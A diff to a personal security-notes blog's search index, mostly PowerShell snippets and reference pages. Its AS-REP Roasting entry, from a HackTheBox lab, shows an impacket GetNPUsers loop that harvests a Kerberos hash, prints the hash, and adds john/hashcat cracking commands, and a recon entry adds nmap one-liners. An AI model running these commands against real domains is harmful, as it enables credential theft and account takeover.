@@ -192,7 +192,7 @@ window.store = {
         
         "title": "AS-REP Roasting",
         "tags": ["impacket","pentest","kerberoasting","kerberos","Windows",],
-        "content": "AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.\nUse the Impacket tool GetNPUsers.py to try to get a hash for each user\nλ ~/ctf/htb/forest/ for user in $(cat usernames.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done [*] Getting TGT for sebastien [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for lucinda [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB:25311259ddd6d0e65a4ae2cd898c547b$2328b382956004167ef612abbfd0b3350d362f386d70deadf093d73dd33fadea8bf648d3d7c1cab3565b508a9dafb06cb399ac26e04521ffa22edc882213994257e53976a81b78aaf49dfe02da14f6f76fc7def2a7d4e7e8ff696efa29a1ac4a8df2c0f7856df3c7aa7bbff60e93c1e1fbfc538745a0ffefa3f383d68ddfb4984d1194bc56cc9d168b69a512901815da53cba71a2d0a13c6369fd1b74b9ce3367119502354b2cae4ae3096e5ba4a041fa8a0d1d7f4a92c0f47d2c6ee7bcc73b7f2c3b10955799c807bf43d3035488fb385c68568e770d87d771343e16266ea8f [*] Getting TGT for andy [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for mark [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for santi [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set The hash is quickly cracked with hashcat.\n", 
+        "content": "AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.\nUse the Impacket tool GetNPUsers.py to try to get a hash for each user\nλ ~/ctf/htb/forest/ for user in $(cat usernames.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done [*] Getting TGT for sebastien [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for lucinda [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB:25311259ddd6d0e65a4ae2cd898c547b$2328b382956004167ef612abbfd0b3350d362f386d70deadf093d73dd33fadea8bf648d3d7c1cab3565b508a9dafb06cb399ac26e04521ffa22edc882213994257e53976a81b78aaf49dfe02da14f6f76fc7def2a7d4e7e8ff696efa29a1ac4a8df2c0f7856df3c7aa7bbff60e93c1e1fbfc538745a0ffefa3f383d68ddfb4984d1194bc56cc9d168b69a512901815da53cba71a2d0a13c6369fd1b74b9ce3367119502354b2cae4ae3096e5ba4a041fa8a0d1d7f4a92c0f47d2c6ee7bcc73b7f2c3b10955799c807bf43d3035488fb385c68568e770d87d771343e16266ea8f [*] Getting TGT for andy [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for mark [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for santi [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set List of users 1 impacket-GetNPUsers -dc-ip \u0026lt;target-ip\u0026gt; example.local/ -no-pass -usersfile users.txt Crack hash or use pass-the-hash 1 2 3 john --format=krb5asrep --wordlist=wordlist.txt hash.txt # or hashcat -m 18200 -a 0 hash.txt wordlist.txt The hash is quickly cracked with hashcat.\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/as_rep_roasting\/"
     },
     
@@ -318,6 +318,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/cmdlet\/": {
+        
+        "title": "cmdlet",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/cmdlet\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/compositionality\/": {
         
         "title": "compositionality",
@@ -434,6 +444,16 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "https:\/\/kdbed.github.io\/tags\/cryptography\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/csharp\/": {
+        
+        "title": "csharp",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/csharp\/"
     },
     
     
@@ -648,6 +668,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/grpc\/": {
+        
+        "title": "grpc",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/grpc\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/happiness\/": {
         
         "title": "Happiness",
@@ -788,6 +818,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/ip_time_to_live_ttl\/": {
+        
+        "title": "IP Time to Live (TTL)",
+        "tags": [],
+        "content": "packetpushers\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/ip_time_to_live_ttl\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/ipsec\/": {
         
         "title": "IPsec",
@@ -882,7 +922,7 @@ window.store = {
         
         "title": "Lang - Test",
         "tags": [],
-        "content": " extern crate regex; use regex::Regex; fn main() { let re = Regex::new(r\u0026#34;^\\d{4}-\\d{2}-\\d{2}$\u0026#34;).unwrap(); println!(\u0026#34;test\u0026#34;); assert!(re.is_match(\u0026#34;2014-01-01\u0026#34;)); } 1 2 3 4 5 #include \u0026lt;iostream\u0026gt; int main(){ std::cout\u0026lt;\u0026lt;\u0026#34;Hello, World.\\n\u0026#34;; return 0; } Hello, World. 1 2 3 4 5 6 7 8 9 10 11 // Hello World! program namespace HelloWorld { class Hello { static void Main(string[] args) { System.Console.WriteLine(\u0026#34;Hello World!\u0026#34;); } } } Hello World! ", 
+        "content": "extern crate primal; use primal::Sieve; fn num_divisors(n: usize, primes: \u0026amp;Sieve) -\u0026gt; Option\u0026lt;usize\u0026gt; { match primes.factor(n) { Ok(factors) =\u0026gt; Some(factors.into_iter().fold(1, |acc, (_, x)| acc * (x + 1))), Err(_) =\u0026gt; None, } } fn main() { println!(\u0026#34;24 days of Rust - primal (day 2)\u0026#34;); let sieve = Sieve::new(10000); let suspect = 5273; println!(\u0026#34;{} is prime: {}\u0026#34;, suspect, sieve.is_prime(suspect)); let not_a_prime = 1024; println!(\u0026#34;{} is prime: {}\u0026#34;, not_a_prime, sieve.is_prime(not_a_prime)); let n = 1000; match sieve.primes_from(0).nth(n - 1) { Some(number) =\u0026gt; println!(\u0026#34;{}th prime is {}\u0026#34;, n, number), None =\u0026gt; println!(\u0026#34;I don\u0026#39;t know anything about {}th prime.\u0026#34;, n), } println!(\u0026#34;{:?}\u0026#34;, sieve.factor(2610)); println!(\u0026#34;{:?}\u0026#34;, num_divisors(2610, \u0026amp;sieve)); } 1 2 3 4 5 #include \u0026lt;iostream\u0026gt; int main(){ std::cout\u0026lt;\u0026lt;\u0026#34;Hello, World.\\n\u0026#34;; return 0; } Hello, World. 1 2 3 4 5 6 7 8 9 10 11 // Hello World! program namespace HelloWorld { class Hello { static void Main(string[] args) { System.Console.WriteLine(\u0026#34;Hello World!\u0026#34;); } } } Hello World! ", 
         "url": "https:\/\/kdbed.github.io\/posts\/lang_test\/"
     },
     
@@ -1128,6 +1168,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/os_identification_ping\/": {
+        
+        "title": "OS Identification - Ping",
+        "tags": [],
+        "content": "IP Time to Live (TTL) on the ICMP packets The default TTL on windows is 128, which gets decremented by one at the router between the host and the box to 127. On the other hand the default for Linux is typically 64, so expect to see 63 for a Linux host.\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/os_identification_ping\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/password\/": {
         
         "title": "password",
@@ -1194,6 +1244,16 @@ window.store = {
         "tags": ["wordlists","pentest",],
         "content": "Generating Wordlists Username anarchy http://morningstarsecurity.com/research/username-anarchy https://github.com/urbanadventurer/username-anarchy/\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentest_generatingwordlists\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_grpc_port_50051\/": {
+        
+        "title": "Pentest - gRPC Port 50051",
+        "tags": ["grpc","pentest",],
+        "content": "gRPC gRPC (short for Google Remote Procedure Call) is a modern open-source framework developed by Google for creating high-performance, language-agnostic remote procedure call (RPC) systems. It enables communication and interaction between different applications or services running on different platforms and written in different programming languages.\nOn Linux, gRPC provides a mechanism for building distributed systems by allowing services to communicate with each other efficiently and securely over a network. It utilizes HTTP/2 protocol as its transport layer and supports different serialization formats like Protocol Buffers (protobuf) for efficient data exchange.\nTo use gRPC on Linux, you typically follow these steps:\nDefine the interface: Start by defining the API using the Protocol Buffers language (protobuf). This involves creating a `.proto` file where you specify the service methods, message types, and their fields.\nGenerate code: Once you have the `.proto` file, you need to generate code in the target language you\u0026rsquo;re using. There are gRPC code generators available for various programming languages. These generators will generate client and server stubs, allowing you to implement the service methods.\nImplement the service: Write the server-side code that implements the service methods defined in the `.proto` file. This code will handle the actual logic and functionality of the service.\nBuild and run: Compile the generated code along with your implementation, and then run the server application. It will listen for incoming requests on a specified network port.\nCreate clients: Implement the client-side code to communicate with the server using the generated client stubs. Clients can make requests to the server, invoking the defined service methods.\nTest and deploy: Test your gRPC service to ensure it functions correctly. Once satisfied, you can deploy it to production or use it as part of a larger distributed system.\ngRPC simplifies the process of building scalable and efficient distributed systems by providing features like bi-directional streaming, flow control, authentication, and load balancing. It\u0026rsquo;s widely used in various domains, including microservices architectures, cloud-native applications, and inter-service communication in large-scale systems.\nKeep in mind that the specific implementation details may vary depending on the programming language you\u0026rsquo;re using to build your gRPC service. However, the fundamental concepts and workflow remain consistent across platforms and languages.\nUI akin to Postman : https://github.com/fullstorydev/grpcui can act as middleware in order to test, eg, SQLi (SQL Injection)\nInterceptor https://dev.to/techschoolguru/use-grpc-interceptor-for-authorization-with-jwt-1c5h\ncurl https://github.com/fullstorydev/grpcurl#installation\npython https://www.cloudbees.com/blog/using-grpc-in-python\nhttps://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_grpc_port_50051\/"
     },
     
     
@@ -1378,6 +1438,26 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/powershell_common_members_of_two_groups\/": {
+        
+        "title": "PowerShell - Common Members of two groups",
+        "tags": [],
+        "content": "Get members in common for 2 groups in AD Function Get-ADGroupMembersInBothGroups { Param ( [Parameter(Mandatory=$true)] [string]$Group1, [Parameter(Mandatory=$true)] [string]$Group2 ) $Group1Members = Get-ADGroup -Identity $Group1 -properties members |select -expand members $Group2Members = Get-ADGroup -Identity $Group2 -properties members|select -expand members $match = $Group1Members | Where-Object {$Group2Members -contains $_} write-host $match } ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/powershell_common_members_of_two_groups\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/powershell_custom_execution_timer\/": {
+        
+        "title": "PowerShell - Custom Execution Timer",
+        "tags": [],
+        "content": "Custom Execution Timer source: devblogs\nfunction Measure-CommandEx { [CmdletBinding()] param ( [Parameter(Mandatory, Position = 0)] [scriptblock]$Expression, [Parameter(ValueFromPipeline)] [psobject[]]$InputObject ) Begin { $stopWatch = New-Object -TypeName \u0026#39;System.Diagnostics.Stopwatch\u0026#39; \u0026lt;# We need to define result as a list because the way objects are passed to the pipeline. If you pass a collection of objects, the pipeline sends them one by one, and the result is always overridden by the last item. #\u0026gt; [System.Collections.Generic.List[PSObject]]$result = @() } Process { if ($InputObject) { # Starting the stopwatch. $stopWatch.Start() # Creating the \u0026#39;$_\u0026#39; variable. $dollarUn = New-Object -TypeName psvariable -ArgumentList @(\u0026#39;_\u0026#39;, $InputObject) \u0026lt;# Overload is: InvokeWithContext( Dictionary\u0026lt;string, scriptblock\u0026gt; functionsToDefine, List\u0026lt;psvariable\u0026gt; variablesToDefine, object[] args ) #\u0026gt; $result.AddRange($Expression.InvokeWithContext($null, $dollarUn, $null)) $stopWatch.Stop() } else { $stopWatch.Start() $result.AddRange($Expression.InvokeReturnAsIs()) $stopWatch.Stop() } } End { return [PSCustomObject]@{ ElapsedTimespan = $stopWatch.Elapsed Result = $result } } } ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/powershell_custom_execution_timer\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/powershell_get_domain_controllers_in_forest\/": {
         
         "title": "PowerShell - Get Domain Controllers in Forest",
@@ -1394,6 +1474,16 @@ window.store = {
         "tags": [],
         "content": "Log Function for powershell function Write-Log { [CmdletBinding()] param( [Parameter()] [ValidateNotNullOrEmpty()] [string]$Message, [Parameter()] [ValidateNotNullOrEmpty()] [ValidateSet(\u0026#39;Information\u0026#39;,\u0026#39;Warning\u0026#39;,\u0026#39;Error\u0026#39;)] [string]$Severity = \u0026#39;Information\u0026#39; ) [pscustomobject]@{ Time = (Get-Date -f g) Message = $Message Severity = $Severity } | Export-Csv -Path \u0026#34;$env:Temp\\LogFile.csv\u0026#34; -Append -NoTypeInformation } From : ATA\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/powershell_log_function\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/powershell_regex_string_between_two_strings\/": {
+        
+        "title": "PowerShell - Regex - string between two strings",
+        "tags": [],
+        "content": "Regex - string between two strings 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function GetStringBetweenTwoStrings($firstString, $secondString, $importPath){ #Get content from file $file = gc -raw $importPath #Regex pattern to compare two strings $pattern = \u0026#39;$firstString(.*?)$secondString\u0026#39; #Perform the opperation $result = [regex]::Match($file,$pattern).Groups.Value #Return result write-host $result } ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/powershell_regex_string_between_two_strings\/"
     },
     
     
@@ -1434,6 +1524,16 @@ window.store = {
         "tags": ["powerShell",],
         "content": "Splatting in powershell Splatting allows one to format and send arguments to cmdlets and functions. Typically use dash+parameter name+argument\nCopy-Item -Path \u0026#34;Testfile.txt\u0026#34; -Destination \u0026#34;CopiedFile.txt\u0026#34; -WhatIf -force -Recurse Copy-Item ` -Path \u0026#34;Testfile.txt\u0026#34; ` -Destination \u0026#34;CopiedFile.txt\u0026#34; ` -WhatIf ` -force ` Instead you can splat a parameter set. First create a hashtable containing key/value pairs of each parameter and parameter argument. Then pass that set of parameters to the command with @\u0026lt;hashtablename\u0026gt;\n$Params = @{ \u0026#34;Path\u0026#34; = \u0026#34;Testfile.txt\u0026#34; \u0026#34;Destination\u0026#34; = \u0026#34;CopiedFile.txt\u0026#34; \u0026#34;WhatIf\u0026#34; = $true \u0026#34;force\u0026#34; = $true \u0026#34;Recurse\u0026#34; = $true } Copy-Item @Params $Params = @{ \u0026#34;Path\u0026#34; = \u0026#34;TestFile.txt\u0026#34; \u0026#34;Destination\u0026#34; = \u0026#34;CopiedFile.txt\u0026#34; } Copy-Item @Params -Force -WhatIf In Powershell 7.1, you can override splatted parameters:\n$Params = @{ \u0026#34;Path\u0026#34; = \u0026#34;TestFile.txt\u0026#34; \u0026#34;Destination\u0026#34; = \u0026#34;CopiedFile.txt\u0026#34; \u0026#34;WhatIf\u0026#34; = $True \u0026#34;Force\u0026#34; = $True } Copy-Item @Params -WhatIf:$False For positional parameters, splat an array:\n$ParamArray = @( \u0026#34;TestFile.txt\u0026#34; \u0026#34;CopiedFile.txt\u0026#34; ) Copy-Item @ParamArray Proxy Functions and Splatted Commands : these functions allow you to add additional parameters to the original cmdlet and then call that cmdlet with the new parameters. When you run a function in PowerShell, PowerShell creates an automatic array variable called $Args. This array contains all unnamed parameter values passed to that function.\nYou\u0026rsquo;ll find another automatic variable called $PSBoundParameters which contains a hashtable of all bound parameters. Notice below the Test-Function function that returns the $Param1 and $Param2 parameters.\nFunction Test-Function { Param( $Param1, $Param2 ) Write-Host \u0026#34;Unnamed Parameters\u0026#34; -ForegroundColor \u0026#39;Green\u0026#39; $Args Write-Host \u0026#34;Bound Parameters\u0026#34; -ForegroundColor \u0026#39;Green\u0026#39; $PSBoundParameters } Test-Function \u0026#34;test1\u0026#34; \u0026#34;test2\u0026#34; \u0026#34;test3\u0026#34; -Param1 \u0026#34;testParam\u0026#34; -Param2 \u0026#34;testParam2\u0026#34; Unnamed Parameters test1 test2 test3 Bound Parameters Key Value --- ----- Param1 testParam Param2 testParam2 Building a Wrapper Function using Splatted Parameters* To show how useful splatting can be in wrapper functions, create a custom function that passes unnamed parameters and named parameters to the Copy-Item cmdlet. With this technique, you can quickly create custom functions that add additional functionality but retain the same parameter set you would expect.\nFunction Copy-CustomItem { Get-ChildItem Copy-Item @Args @PSBoundParameters Get-ChildItem } Copy-CustomItem \u0026#34;TestFile.txt\u0026#34; \u0026#34;CopiedFile.txt\u0026#34; -force -verbose ", 
         "url": "https:\/\/kdbed.github.io\/posts\/powershell_splatting\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/powershell_writing_cmdlets_in_c\/": {
+        
+        "title": "PowerShell - Writing cmdlets in C#",
+        "tags": ["cmdlet","csharp","powershell",],
+        "content": "Writing powershell cmdlets in C# source: dotnetninja\nOverview create a new class that derives from one of two base classes (Cmdlet or PsCmdlet), add properties to the class to accept your parameters, override one or more methods in the base class to provide your functionality, and decorate the class and properties with a few attributes.\ncmdlet name all defined in constants in the C# reference library\nVerbsCommon: Add, Clear, Close, Copy, Enter, Exit, Find, Format, Get, Hide, Join, Lock, Move, New, Open, Optimize, Pop, Push, Redo, Remove, Rename, Reset, Resize, Search, Select, Set, Show, Skip, Split, Step, Switch, Undo, Unlock, Watch\nVerbsCommunications: Connect, Disconnect, Read, Receive, Send, Write\nVerbsData: Backup, Checkpoint, Compare, Compress, Convert, ConvertFrom, ConvertTo, Dismount, Edit, Expand, Export, Group, Import, Initialize, Limit, Merge, Mount, Out, Publish, Restore, Save, Sync, Unpublish, Update\nVerbsDiagnostic: Debug, Measure, Ping, Repair, Resolve, Test, Trace\nVerbsLifecycle: Approve, Assert, Complete, Confirm, Deny, Disable, Enable, Install, Invoke, Register, Request, Restart, Resume, Start, Stop, Submit, Suspend, Uninstall, Unregister, Wait\nVerbsOther: Use\nVerbsSecurity: Block, Grant, Protect, Revoke, Unblock, Unprotect\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/powershell_writing_cmdlets_in_c\/"
     },
     
     
@@ -1552,7 +1652,7 @@ window.store = {
         
         "title": "Recon - Port Scanning and nmap",
         "tags": ["infosec","nmap","pentest",],
-        "content": "Basic nmap scan nmap -sC -sV -oA nmap/result \u0026lt;ip\u0026gt; Flags:\n-oA \u0026lt;basename\u0026gt;: Output in the three major formats at once -sV: Probe open ports to determine service/version info -sC: default scripts ", 
+        "content": "Basic nmap scan nmap -sC -sV -oA nmap/result \u0026lt;ip\u0026gt; Flags:\n-oA \u0026lt;basename\u0026gt;: Output in the three major formats at once -sV: Probe open ports to determine service/version info -sC: default scripts UDP Scan sudo nmap -sU -sS -sC -sV -oA \u0026lt;NAME\u0026gt;.udp \u0026lt;IP\u0026gt; -v Script categories List available nse scripts nmap through socks4 proxy ftp bounce scan format ports=$(nmap -p- -Pn --min-rate=1000 -T4 10.10.11.205 | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) nmap -p$ports -Pn -sC -sV 10.10.11.205 nmap Automator ", 
         "url": "https:\/\/kdbed.github.io\/posts\/recon_port_scanning_and_nmap\/"
     },
     
@@ -2034,6 +2134,16 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "https:\/\/kdbed.github.io\/tags\/windows\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/windows_cached_credentials_as_system\/": {
+        
+        "title": "Windows - Cached Credentials as SYSTEM",
+        "tags": [],
+        "content": "Credentials cached as SYSTEM Cached Passwords - SYSTEM\nThere are passwords that can be stored in the SYSTEM context that can\u0026rsquo;t be seen in the normal Credential Manager view.\nDownload PsExec.exe from Technet and copy it to C:\\Windows\\System32.\nFrom a command prompt run: .\nFrom the new DOS window run:\nRemove any items that appear in the list of Stored User Names and Passwords. Restart the computer.\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/windows_cached_credentials_as_system\/"
     },
     
     
